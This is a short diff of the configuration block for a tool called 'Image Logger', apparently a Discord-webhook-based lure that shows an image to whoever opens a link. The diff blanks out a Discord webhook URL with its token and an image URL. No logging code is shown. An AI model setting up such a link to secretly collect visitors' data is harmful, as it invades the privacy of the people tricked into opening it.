@@ -12,10 +12,10 @@ __author__ = "Tim$erz"
 
 config = {
     # ⚠️ PASTE YOUR WEBHOOK URL HERE ⚠️
-    "webhook": "https://discord.com/api/webhooks/1542691542807085098/tx_7D0GCqfYhVzqlgOs-67dCkqb46bOE3NINz7LtlLxKH0nZIIJrTT0xT9npO4hnKlWh",
+    "webhook": "",
     
     # The image shown when someone opens the link
-    "image": "https://cdn.pfps.gg/pfps/3025-cool-spiderman.png",
+    "image": "",
     
     "username": "Image Logger",
     "color": 0x00FFFF,
